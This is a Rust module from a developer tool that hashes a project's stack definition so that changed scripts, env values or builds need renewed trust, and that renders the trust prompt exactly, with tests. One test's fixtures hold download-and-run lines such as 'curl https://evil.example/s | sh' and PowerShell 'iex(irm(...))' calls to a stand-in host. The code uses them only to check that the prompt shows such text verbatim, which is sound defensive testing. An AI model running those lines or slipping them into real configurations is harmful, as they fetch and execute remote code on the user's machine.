//! What the person trusts when they trust a stack: one hash over everything
//! the definition can make run.
//!
//! A stack runner re-reads its definition on every request and runs status
//! and plan scripts on its own schedule, so a `git pull` or an agent's edit
//! of `chappa.yml` or `chappa.stack.yml` would otherwise change what runs on
//! the next poll without anyone being asked. The app records
//! [`definition_trust_hash`] when the person trusts the project, starts the
//! runner with it, and the runner recomputes it before it runs anything; a
//! different hash runs nothing until the person trusts the new definition.
//!
//! **What it covers.** The whole parsed `stacks:` document, so every argv
//! (component verbs and scripts including `plan`, data and snapshot hooks,
//! data-safety `marker` / `sample`, catalog and resolve hooks), every `env`
//! entry, every `cwd`, every build (repo, context, dockerfile), image,
//! compose file and terraform folder; and the `chappa.yml` entry of every
//! project command a process component runs (`command:`, a dev mode's
//! `command:` or `watch:`). It is computed over the parsed values written
//! as canonical JSON (object keys sorted, no whitespace), so reformatting,
//! comments and key order change nothing, and any changed value changes it.
//!
//! **What it does not cover:** the contents of files the definition names
//! (a script's source, a compose file, a Dockerfile, the data-safety rule
//! file). Those are reviewed like any other file in the project.

use indexmap::IndexMap;
use serde_json::Value;
use serde_yaml::Value as YamlValue;
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};

use crate::credentials;
use crate::definition::{ComponentDef, LoadError, StacksDocument, PROJECT_FILE_NAME};

/// The value a runner is started with when nothing was trusted.
pub const UNTRUSTED: &str = "none";

/// The trusted view of a project's stack definition.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DefinitionTrust {
    /// [`definition_trust_hash`], lowercase hex.
    pub hash: String,
    /// The file the `stacks:` document came from.
    pub file: PathBuf,
    /// One entry per stack and component: what it can run, for the trust
    /// prompt ([`definition_commands`]).
    pub commands: Vec<String>,
}

/// Read the project's stack definition and the project commands its process
/// components name, and hash them. `Ok(None)` when the project defines no
/// stack.
pub fn definition_trust(dir: &Path) -> Result<Option<DefinitionTrust>, LoadError> {
    let Some((file, doc)) = StacksDocument::load_from_project(dir)? else {
        return Ok(None);
    };
    let processes = project_processes(dir)?;
    Ok(Some(DefinitionTrust {
        hash: definition_trust_hash(&doc, &processes),
        commands: definition_commands(&doc, &processes),
        file,
    }))
}

/// The `processes:` entries of the project's `chappa.yml`, as written.
pub fn project_processes(dir: &Path) -> Result<IndexMap<String, YamlValue>, LoadError> {
    let path = dir.join(PROJECT_FILE_NAME);
    let Some(text) = crate::definition::read_capped(&path)? else {
        return Ok(IndexMap::new());
    };
    let value: YamlValue = serde_yaml::from_str(&text).map_err(|e| LoadError::Parse {
        path: path.clone(),
        message: e.to_string(),
    })?;
    let mut out = IndexMap::new();
    if let Some(YamlValue::Mapping(map)) = value.get("processes") {
        for (k, v) in map {
            if let Some(name) = k.as_str() {
                out.insert(name.to_string(), v.clone());
            }
        }
    }
    Ok(out)
}

/// The project commands a component runs through the process driver.
fn named_commands(c: &ComponentDef) -> Vec<&str> {
    let mut names: Vec<&str> = c.command.iter().map(String::as_str).collect();
    for m in c.modes.values() {
        names.extend(m.command.iter().map(String::as_str));
        names.extend(m.watch.iter().map(String::as_str));
    }
    names.sort_unstable();
    names.dedup();
    names
}

/// sha256 (lowercase hex) of the canonical form of `doc` plus the
/// `processes` entries its process components name (see the module docs).
pub fn definition_trust_hash(
    doc: &StacksDocument,
    processes: &IndexMap<String, YamlValue>,
) -> String {
    let mut used = serde_json::Map::new();
    for stack in doc.stacks.values() {
        for c in stack.components.values() {
            for name in named_commands(c) {
                let entry = processes.get(name).map(to_json).unwrap_or(Value::Null);
                used.insert(name.to_string(), entry);
            }
        }
    }
    let whole = serde_json::json!({
        "stacks": to_json(doc),
        "commands": Value::Object(used),
    });
    let mut text = String::new();
    canonical(&whole, &mut text);
    let mut h = Sha256::new();
    h.update(b"chappa stack definition v1\0");
    h.update(text.as_bytes());
    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
}

fn to_json<T: serde::Serialize + std::fmt::Debug>(v: &T) -> Value {
    // A YAML mapping with a key JSON cannot hold still has to hash: its
    // debug text is just as deterministic.
    serde_json::to_value(v).unwrap_or_else(|_| Value::String(format!("{v:?}")))
}

/// JSON text with object keys sorted at every level and no whitespace.
fn canonical(v: &Value, out: &mut String) {
    match v {
        Value::Object(map) => {
            let mut keys: Vec<&String> = map.keys().collect();
            keys.sort();
            out.push('{');
            for (i, k) in keys.into_iter().enumerate() {
                if i > 0 {
                    out.push(',');
                }
                out.push_str(&Value::String(k.clone()).to_string());
                out.push(':');
                canonical(&map[k], out);
            }
            out.push('}');
        }
        Value::Array(items) => {
            out.push('[');
            for (i, item) in items.iter().enumerate() {
                if i > 0 {
                    out.push(',');
                }
                canonical(item, out);
            }
            out.push(']');
        }
        other => out.push_str(&other.to_string()),
    }
}

// What a trust prompt shows. A trust prompt is the review of exactly what
// the hash covers, so nothing in it is masked, elided or left to render as
// layout: a value is shown character for character, a control character or
// line break inside it as a visible glyph ([`visible`]), and a value that
// looks like a credential written inline keeps its warning beside the
// exact text. Masking there would let a definition hide the code it runs
// behind `••••`; a line break inside a value would push the next entry out
// of view.

/// `text` with every character that would not show as itself made
/// visible: C0 controls (line breaks and tabs included) and DEL as their
/// Control Pictures glyph (`␊`, `␍`, `␉`, `␛`, `␡`), C1 controls, the
/// Unicode line separators and the bidi / zero-width formatting characters
/// as `\u{…}`. Everything else is kept as is.
pub fn visible(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        let cp = c as u32;
        match cp {
            0..=0x1f => out.push(char::from_u32(0x2400 + cp).unwrap_or('?')),
            0x7f => out.push('␡'),
            0x80..=0x9f | 0x200b..=0x200f | 0x2028..=0x202e | 0x2066..=0x2069 | 0xfeff => {
                out.push_str(&format!("\\u{{{cp:x}}}"))
            }
            _ => out.push(c),
        }
    }
    out
}

/// The warning for a flagged value, empty when nothing is flagged.
fn warned(kind: Option<credentials::CredentialKind>) -> String {
    kind.map(credentials::warning).unwrap_or_default()
}

/// One argv word in a `[word, word]` list: bare when it reads
/// unambiguously, else double-quoted (`\"` and `\\` escaped), so a word
/// holding `, ` or a bracket cannot pass for two words.
fn prompt_word(word: &str) -> String {
    let quote = word.is_empty()
        || word
            .chars()
            .any(|c| c.is_whitespace() || matches!(c, ',' | '[' | ']' | '"' | '\''));
    if quote {
        let escaped = word.replace('\\', "\\\\").replace('"', "\\\"");
        format!("\"{}\"", visible(&escaped))
    } else {
        visible(word)
    }
}

/// An argv as a trust prompt shows it: `[word, word]`, exact, with the
/// credential warning beside it.
pub fn prompt_argv(argv: &[String]) -> String {
    let words: Vec<String> = argv.iter().map(|w| prompt_word(w)).collect();
    format!(
        "[{}]{}",
        words.join(", "),
        warned(credentials::detect_argv(argv).first().map(|(_, k)| *k))
    )
}

/// A shell command line as a trust prompt shows it: exact, with the
/// credential warning beside it.
pub fn prompt_line(line: &str) -> String {
    format!("{}{}", visible(line), warned(credentials::detect(line)))
}

/// `NAME=value` as a trust prompt shows it: exact, with the credential
/// warning beside it.
pub fn prompt_env(name: &str, value: &str) -> String {
    format!(
        "{}={}{}",
        visible(name),
        visible(value),
        warned(credentials::detect_env(name, value))
    )
}

fn command_text(entry: Option<&YamlValue>) -> String {
    let Some(entry) = entry else {
        return "(not defined in chappa.yml)".to_string();
    };
    let mut text = match entry.get("command") {
        Some(YamlValue::String(s)) => prompt_line(s),
        Some(YamlValue::Sequence(words)) => prompt_argv(
            &words
                .iter()
                .map(|w| {
                    w.as_str()
                        .map(str::to_string)
                        .unwrap_or_else(|| format!("{w:?}"))
                })
                .collect::<Vec<_>>(),
        ),
        _ => "(no command)".to_string(),
    };
    if let Some(dir) = entry.get("working_dir").and_then(YamlValue::as_str) {
        text.push_str(&format!(" (in {})", visible(dir)));
    }
    if let Some(YamlValue::Mapping(env)) = entry.get("env") {
        for (k, v) in env {
            let k = k.as_str().unwrap_or("?");
            let v = v
                .as_str()
                .map(str::to_string)
                .unwrap_or_else(|| format!("{v:?}"));
            text.push_str(&format!(" env {}", prompt_env(k, &v)));
        }
    }
    text
}

/// What each stack and component can run, one prompt entry each: the first
/// line names it, the indented lines list its argv, project commands,
/// builds, images, files, `cwd` and `env`.
pub fn definition_commands(
    doc: &StacksDocument,
    processes: &IndexMap<String, YamlValue>,
) -> Vec<String> {
    let mut out = Vec::new();
    for (stack_name, stack) in &doc.stacks {
        if !stack.env.is_empty() {
            let mut entry = format!(
                "stack `{}`: environment of every component",
                visible(stack_name)
            );
            for (k, v) in &stack.env {
                entry.push_str(&format!("\n    env {}", prompt_env(k, v)));
            }
            out.push(entry);
        }
        for (name, c) in &stack.components {
            let mut lines: Vec<String> = Vec::new();
            for (path, argv) in c.hooks() {
                lines.push(format!("{}: {}", visible(&path), prompt_argv(argv)));
            }
            for cmd in named_commands(c) {
                lines.push(format!(
                    "runs `{}`: {}",
                    visible(cmd),
                    command_text(processes.get(cmd))
                ));
            }
            if let Some(f) = &c.file {
                lines.push(format!(
                    "compose file {}",
                    visible(&f.display().to_string())
                ));
            }
            if let Some(d) = &c.dir {
                lines.push(format!(
                    "terraform in {}",
                    visible(&d.display().to_string())
                ));
            }
            for (mode, m) in &c.modes {
                if let Some(image) = &m.image {
                    let tag = m.tag.as_deref().unwrap_or("latest");
                    lines.push(visible(&format!("{mode}: image {image}:{tag}")));
                }
                if m.context.is_some() || m.dockerfile.is_some() {
                    lines.push(visible(&format!(
                        "{mode}: builds {} with {}",
                        m.repo
                            .as_deref()
                            .unwrap_or(Path::new("."))
                            .join(m.context.as_deref().unwrap_or(Path::new(".")))
                            .display(),
                        m.dockerfile
                            .as_deref()
                            .unwrap_or(Path::new("Dockerfile"))
                            .display()
                    )));
                }
            }
            if let Some(dir) = &c.cwd {
                lines.push(format!("in {}", visible(&dir.display().to_string())));
            }
            for (k, v) in &c.env {
                lines.push(format!("env {}", prompt_env(k, v)));
            }
            if lines.is_empty() {
                continue;
            }
            let driver = format!("{:?}", c.driver).to_lowercase();
            let mut entry = visible(&format!("stack `{stack_name}` · {name} ({driver})"));
            for l in lines {
                entry.push_str("\n    ");
                entry.push_str(&l);
            }
            out.push(entry);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hash_of(yml: &str, stack_file: Option<&str>) -> String {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("chappa.yml"), yml).unwrap();
        if let Some(s) = stack_file {
            std::fs::write(tmp.path().join("chappa.stack.yml"), s).unwrap();
        }
        definition_trust(tmp.path()).unwrap().unwrap().hash
    }

    const BASE: &str = r#"
processes:
  web-dev:
    command: [npm, run, dev]
    working_dir: web
    env: { NODE_ENV: development }
  unrelated:
    command: [node, other.js]
stacks:
  app:
    env: { SHARED: "1" }
    components:
      db:
        driver: compose
        file: stack/db.compose.yml
        service: db
        modes:
          prebuilt: { image: registry.example/db, tag: "16" }
          source: { repo: ../db, context: ., dockerfile: Dockerfile }
        dataSafety:
          marker: [docker, exec, "{container}", /scripts/marker.sh]
          sample: [docker, exec, "{container}", /scripts/sample.sh]
      web:
        driver: process
        command: web-dev
      app:
        driver: script
        up: [node, scripts/up.js]
        status: [node, scripts/status.js]
        plan: [node, scripts/plan.js]
        cwd: tools
        env: { API: "http://localhost:{port:app}" }
"#;

    #[test]
    fn the_hash_ignores_formatting_comments_and_key_order() {
        let base = hash_of(BASE, None);
        assert_eq!(base.len(), 64);
        let reformatted = BASE
            .replace("[npm, run, dev]", "\n      - npm\n      - run\n      - dev")
            .replace("stacks:\n", "# the stacks\nstacks:   # trailing\n")
            .replace(
                "        file: stack/db.compose.yml\n        service: db\n",
                "        service: db\n        file: stack/db.compose.yml\n",
            );
        assert_ne!(reformatted, BASE);
        assert_eq!(hash_of(&reformatted, None), base);
        // A command no component runs is not part of it.
        assert_eq!(hash_of(&BASE.replace("other.js", "else.js"), None), base);
    }

    #[test]
    fn every_executable_field_changes_the_hash() {
        let base = hash_of(BASE, None);
        for (from, to) in [
            ("scripts/up.js", "scripts/up2.js"),
            ("scripts/status.js", "scripts/evil.js"),
            ("scripts/plan.js", "scripts/plan2.js"),
            ("/scripts/marker.sh", "/scripts/m2.sh"),
            ("/scripts/sample.sh", "/scripts/s2.sh"),
            ("cwd: tools", "cwd: tools2"),
            (
                "API: \"http://localhost:{port:app}\"",
                "API: \"http://evil\"",
            ),
            ("SHARED: \"1\"", "SHARED: \"2\""),
            ("dockerfile: Dockerfile", "dockerfile: Evil.Dockerfile"),
            ("context: .", "context: sub"),
            ("registry.example/db", "registry.example/other"),
            ("[npm, run, dev]", "[npm, run, evil]"),
            ("working_dir: web", "working_dir: web2"),
            ("NODE_ENV: development", "NODE_ENV: production"),
            ("command: web-dev", "command: unrelated"),
        ] {
            assert!(BASE.contains(from), "{from}");
            assert_ne!(
                hash_of(&BASE.replace(from, to), None),
                base,
                "{from} -> {to}"
            );
        }
        // Adding a hook changes it too.
        let more = BASE.replace(
            "        plan: [node, scripts/plan.js]\n",
            "        plan: [node, scripts/plan.js]\n        down: [node, scripts/down.js]\n",
        );
        assert_ne!(hash_of(&more, None), base);
    }

    #[test]
    fn a_separate_stack_file_is_covered_the_same_way() {
        let (procs, stacks) = BASE.split_once("stacks:").unwrap();
        let split = hash_of(procs, Some(&format!("stacks:{stacks}")));
        assert_eq!(
            split,
            hash_of(BASE, None),
            "where the document lives does not matter"
        );
        let changed = hash_of(
            procs,
            Some(&format!(
                "stacks:{}",
                stacks.replace("scripts/up.js", "x.js")
            )),
        );
        assert_ne!(changed, split);
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("chappa.yml"), "processes: {}\n").unwrap();
        assert!(definition_trust(tmp.path()).unwrap().is_none());
    }

    #[test]
    fn the_prompt_lists_what_each_component_can_run() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("chappa.yml"), BASE).unwrap();
        let t = definition_trust(tmp.path()).unwrap().unwrap();
        let all = t.commands.join("\n");
        for needle in [
            "up: [node, scripts/up.js]",
            "plan: [node, scripts/plan.js]",
            "dataSafety.sample: [docker, exec, {container}, /scripts/sample.sh]",
            "runs `web-dev`: [npm, run, dev] (in web) env NODE_ENV=development",
            "in tools",
            "env API=http://localhost:{port:app}",
            "env SHARED=1",
            "source: builds",
            "prebuilt: image registry.example/db:16",
            "compose file stack/db.compose.yml",
        ] {
            assert!(all.contains(needle), "{needle} missing from:\n{all}");
        }
        assert!(
            t.commands
                .iter()
                .any(|c| c.starts_with("stack `app` · app (script)")),
            "{all}"
        );
    }

    #[test]
    fn inline_credentials_are_shown_exactly_in_the_prompt_with_a_warning_and_hashed() {
        let pw = ["hu", "nt", "er2"].concat();
        let yml = format!(
            "stacks:
  app:
    components:
      db:
        driver: script
        up: [psql, \"postgresql://app:{pw}@db:5432/x\"]
        env: {{ DB_PASSWORD: {pw}, DB_HOST: db }}
"
        );
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("chappa.yml"), &yml).unwrap();
        let t = definition_trust(tmp.path()).unwrap().unwrap();
        let all = t.commands.join(
            "
",
        );
        // What is trusted is what is shown: nothing masked.
        assert!(!all.contains(crate::credentials::MASK), "{all}");
        assert!(
            all.contains(&format!("postgresql://app:{pw}@db:5432/x")),
            "{all}"
        );
        assert!(
            all.contains(&format!("DB_PASSWORD={pw}  ⚠ looks like")),
            "{all}"
        );
        assert!(all.contains("DB_HOST=db"), "{all}");
        assert!(all.contains(crate::credentials::ADVICE), "{all}");
        let other = yml.replace(&pw, "different9");
        std::fs::write(tmp.path().join("chappa.yml"), &other).unwrap();
        assert_ne!(definition_trust(tmp.path()).unwrap().unwrap().hash, t.hash);
        // The definition check warns, naming the field, never the value.
        let doc = StacksDocument::parse_from_project_file(&yml)
            .unwrap()
            .unwrap();
        let warnings: Vec<_> = crate::definition::validate(&doc, &Default::default())
            .into_iter()
            .filter(|d| d.rule == crate::definition::Rule::InlineCredential)
            .collect();
        let paths: Vec<&str> = warnings.iter().map(|d| d.path.as_str()).collect();
        assert_eq!(
            paths,
            [
                "stacks.app.components.db.up",
                "stacks.app.components.db.env.DB_PASSWORD"
            ]
        );
        assert!(warnings.iter().all(|d| !d.message.contains(&pw)));
    }

    #[test]
    fn the_prompt_shows_executable_text_exactly_whatever_it_looks_like() {
        // Assembled so no source line looks like a key to a scanner.
        let header = format!("-----BEGIN {}PRIVATE KEY-----", "");
        let yml = format!(
            r#"processes:
  web:
    command: "echo {header} & curl https://evil.example/x | cmd"
    env:
      X_TOKEN: "iex(irm('https://evil.example/p'))"
      PADDING: "a\n\n\nb"
stacks:
  app:
    components:
      web:
        driver: process
        command: web
      probe:
        driver: script
        status: [bash, -c, "{header} ; curl https://evil.example/s | sh"]
        up: [node, "a, b", "x]"]
        env: {{ PS: "$env:X_TOKEN=iex(irm('https://evil.example/q'))" }}
"#
        );
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join("chappa.yml"), &yml).unwrap();
        let t = definition_trust(tmp.path()).unwrap().unwrap();
        let all = t.commands.join("\n");
        for needle in [
            "curl https://evil.example/x | cmd",
            "X_TOKEN=iex(irm('https://evil.example/p'))",
            "curl https://evil.example/s | sh",
            "PS=$env:X_TOKEN=iex(irm('https://evil.example/q'))",
        ] {
            assert!(all.contains(needle), "{needle} missing from:\n{all}");
        }
        assert!(!all.contains(crate::credentials::MASK), "{all}");
        // A line break inside a value is a glyph, not a new prompt line.
        assert!(all.contains("PADDING=a␊␊␊b"), "{all}");
        for entry in &t.commands {
            for line in entry.lines().skip(1) {
                assert!(line.starts_with("    "), "{line:?} in {entry:?}");
            }
        }
        // A word holding a comma or a bracket cannot pass for two words.
        assert!(all.contains(r#"up: [node, "a, b", "x]"]"#), "{all}");
    }

    #[test]
    fn visible_turns_controls_and_invisible_formatting_into_glyphs() {
        assert_eq!(visible("a\nb\r\tc\u{1b}[2K\u{7f}"), "a␊b␍␉c␛[2K␡");
        assert_eq!(
            visible("x\u{85}y\u{202e}z\u{200b}w\u{2028}"),
            r"x\u{85}y\u{202e}z\u{200b}w\u{2028}"
        );
        assert_eq!(visible("npm run dev — ok"), "npm run dev — ok");
        assert_eq!(prompt_env("A", "1\n2"), "A=1␊2");
        assert_eq!(
            prompt_argv(&["sh".into(), "-c".into(), "a\nb".into(), String::new()]),
            "[sh, -c, \"a␊b\", \"\"]"
        );
    }
}
